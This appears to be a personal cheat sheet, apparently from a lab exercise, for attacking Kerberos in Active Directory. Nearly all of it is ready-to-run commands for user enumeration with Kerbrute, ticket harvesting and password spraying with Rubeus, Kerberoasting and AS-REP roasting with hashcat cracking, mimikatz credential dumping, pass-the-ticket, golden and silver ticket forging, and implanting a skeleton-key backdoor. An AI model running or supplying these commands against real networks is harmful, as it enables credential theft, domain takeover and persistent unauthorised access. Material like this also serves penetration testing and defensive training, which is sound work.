# Attacking Kerberos

> Shahrukh Tramboo | January 6th, 2022

--------------------------------------

## Kerberute

This does not require the local account access

https://github.com/ropnop/kerbrute/releases

**Enumerating Users with Kerbrute**


```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Rebeus 

**Harvesting tockets with Rebeus**

```bash
Rubeus.exe harvest /interval:30
```

**Brute-Forcing / Password-Spraying with Rubeus**

Add the IP and domain name to the hosts file from the machine,and then "spray" it against all found users then give the .kirbi TGT for that user.
```bash
echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket
```

**Kerberoasting with Rubeus**

Dump Kerberos hash of any kerberoastable users
```bash
Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

**Kerberoasting with Impacket**

```bash
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
```

**AS-REP Roasting with Rubeus**

This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
```bash
Rubeus.exe asreproast
```

Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.


**Pass the Ticket with mimikatz**

To check the privileges, ensure this outputs [output '20' OK]
```bash
privilege::debug
```

Export all of the .kirbi tickets into the directory that you are currently in
```bash
sekurlsa::tickets /export
```

Now pass the ticket with mimikatz
```bash
kerberos::ptt <ticket>
```

Then klist, to verify that we successfully impersonated the ticket by listing our cached tickets.
```bash
klist
```

**Golden/Silver Ticket Attack with mimikatz**

Dump the hash as well as security identifier needed to create a Golden Ticket.
To create a silver ticket you need to change the /name: to dump the hash pf either a domain admin account or  a service account suck as the SQLService account.
```bash
lsadump::lsa /inject /name:krbtgt
```
Now, Create a Golden/Silver Ticket

This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
```bash
kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:500
```

Use the Golden/Silver Ticket to access other machines

This will open a new elevated command prompt with the given ticket in mimikatz
```bash
misc::cmd
```

**Kerberos backdoors with mimikatz**

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

This will create a skeleton key
```bash
misc::skeleton
```




